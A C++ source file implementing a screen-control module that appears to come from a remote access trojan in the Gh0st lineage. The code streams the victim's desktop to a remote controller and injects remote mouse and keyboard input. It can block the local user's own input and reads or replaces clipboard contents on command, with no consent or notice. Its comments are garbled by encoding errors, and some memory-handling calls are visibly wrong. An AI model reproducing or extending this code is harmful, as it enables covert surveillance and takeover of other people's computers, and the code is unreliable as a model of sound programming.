// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenManager.h"
#include "Common.h"
#include <IOSTREAM>
#include <Winable.h>
using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))
CScreenManager::CScreenManager(IOCPClient* ClientObject):CManager(ClientObject)
{


	m_bIsWorking = TRUE;
    m_bIsBlockInput = FALSE;
/*	m_hWorkThread = MyCreateThread(NULL,0,
		(LPTHREAD_START_ROUTINE)WorkThread,this,0,NULL,true);*/



	m_ScreenSpyObject = new CScreenSpy(16);  

	if (m_ScreenSpyObject==NULL)
	{
		return;
	}
	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);

}


DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{

	CScreenManager *This = (CScreenManager *)lParam;


	This->SendBitMapInfor();         //����bmpλͼ�ṹ
	// �ȿ��ƶ˶Ի����
	
	This->WaitForDialogOpen();   


	This->SendFirstScreen();         
	while (This->m_bIsWorking)
	{

	
	
		This->SendNextScreen();
		
	
	}


	cout<<"ScreenWorkThread Exit"<<endl;

	return 0;
}


VOID CScreenManager::SendBitMapInfor()
{
	
	//����õ�bmp�ṹ�Ĵ�С

	ULONG   ulLength = 1 + m_ScreenSpyObject->GetBISize();   //��С
	LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, 
		ulLength, MEM_COMMIT, PAGE_READWRITE);
	
	szBuffer[0] = TOKEN_BITMAPINFO;
	//���ｫbmpλͼ�ṹ���ͳ�ȥ
	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulLength);
	VirtualFree(szBuffer, 0, MEM_RELEASE);
}

CScreenManager::~CScreenManager()
{

	cout<<"ScreenManager ��������"<<endl;

	m_bIsWorking = FALSE;

	WaitForSingleObject(m_hWorkThread, INFINITE);  
	if (m_hWorkThread!=NULL)
	{
		CloseHandle(m_hWorkThread);
	}

	delete[] m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{

	switch(szBuffer[0])
	{

	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();  
			break;
		}
	case COMMAND_SCREEN_CONTROL:
		{

			BlockInput(false);
			ProcessCommand(szBuffer + 1, ulLength - 1);
			BlockInput(m_bIsBlockInput);  //�ٻظ����û�������
			
			break;
		}
	case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread������
		{
			
			m_bIsBlockInput = *(LPBYTE)&szBuffer[1];   //�����̵�����
			
			BlockInput(m_bIsBlockInput);
			
			break;
		}
	case COMMAND_SCREEN_GET_CLIPBOARD:   //����
		{
			SendClientClipboard();
			break;
		}
	case COMMAND_SCREEN_SET_CLIPBOARD:
		{
			UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
			break;
			
		}
	}
	
}


VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;	
	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength);
	if (hGlobal != NULL) { 
		
		LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal); 
		memcpy(szClipboardVirtualAddress, szBuffer, ulLength); 
		GlobalUnlock(hGlobal);         
		SetClipboardData(CF_TEXT, hGlobal);
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}



VOID CScreenManager::SendClientClipboard()
{
	if (!::OpenClipboard(NULL))  //�򿪼��а��豸
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //������һ���ڴ�
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //���� 
	LPBYTE	szBuffer = new BYTE[iPacketLength];
	
	
	szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_ClientObject->OnServerSending((char*)szBuffer, iPacketLength);
	delete[] szBuffer;
}


VOID CScreenManager::SendFirstScreen()
{
   	//��CScreenSpy��getFirstScreen�����еõ�ͼ������
	//Ȼ����getFirstImageSize�õ����ݵĴ�СȻ���ͳ�ȥ
	BOOL	bRet = FALSE;
	LPVOID	FirstScreenData = NULL;
	

	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();  
	if (FirstScreenData == NULL)
	{
		return;
	}
	
	ULONG	ulFirstSendLength = 1 + m_ScreenSpyObject->GetFirstScreenLength();
	LPBYTE	szBuffer = new BYTE[ulFirstSendLength];
	if (szBuffer == NULL)
	{
		return;
	}
	
	szBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);
	

	m_ClientObject->OnServerSending((char*)szBuffer, ulFirstSendLength);
	
	delete [] szBuffer;

	szBuffer = NULL;
}


VOID CScreenManager::SendNextScreen()
{
   	//�õ����ݣ��õ����ݴ�С��Ȼ����
	//���ǵ�getNextScreen�����Ķ��� 
	LPVOID	NextScreenData = NULL;
	ULONG	ulNextSendLength = 0;
	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
	
	if (ulNextSendLength == 0 || NextScreenData==NULL)
	{		
		return;
	}
	
	ulNextSendLength += 1;

	LPBYTE	szBuffer = new BYTE[ulNextSendLength];
	if (szBuffer == NULL)
	{
		return;
	}
	
	szBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(szBuffer + 1, NextScreenData, ulNextSendLength - 1);
	
	
	m_ClientObject->OnServerSending((char*)szBuffer, ulNextSendLength);

	delete [] szBuffer;
	szBuffer = NULL;
}




VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
	// ���ݰ����Ϸ�
	if (ulLength % sizeof(MSG) != 0)
		return;
	

	// �������
	ULONG	ulMsgCount = ulLength / sizeof(MSG);
	
	// ����������
	
	//1ruan  kdjfkdf   gan
	for (int i = 0; i < ulMsgCount; i++)   //1
	{
		MSG	*Msg = (MSG *)(szBuffer + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
			{
				POINT Point;
				Point.x = LOWORD(Msg->lParam);
				Point.y = HIWORD(Msg->lParam);
				SetCursorPos(Point.x, Point.y);
				SetCapture(WindowFromPoint(Point));  //???
				
				
			}
			break;
		default:
			break;
		}
		
		switch(Msg->message)   //�˿ڷ��ӿ�ݷ�
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, 
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;	
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}	
}
